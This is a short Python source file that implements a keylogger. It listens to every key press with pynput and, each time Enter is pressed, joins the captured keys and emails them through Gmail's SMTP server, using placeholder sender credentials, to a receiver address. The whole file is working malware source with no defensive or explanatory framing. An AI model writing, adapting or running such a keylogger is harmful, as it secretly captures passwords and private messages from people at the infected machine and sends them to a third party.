import smtplib
from pynput.keyboard import Key, Listener

keystrokes = []

def mailtransfer(text):
    message = str(text)
    s = smtplib.SMTP('smtp.gmail.com',587)
    s.starttls()
    s.login('sender@gmail.com','app_password')
    s.sendmail('sender@gmail.com', 'reciever@gmail.com', message)
    print("Successfull!")

def press(key):

    if key != Key.insert:
        keystrokes.append(str(key))
    if key == Key.enter:
        value = ";".join(keystrokes)
        print(value)
        mailtransfer(value)
        keystrokes.clear()

def release(key):
    return True

with Listener(on_press=press, on_release=release) as l:
   l.join()

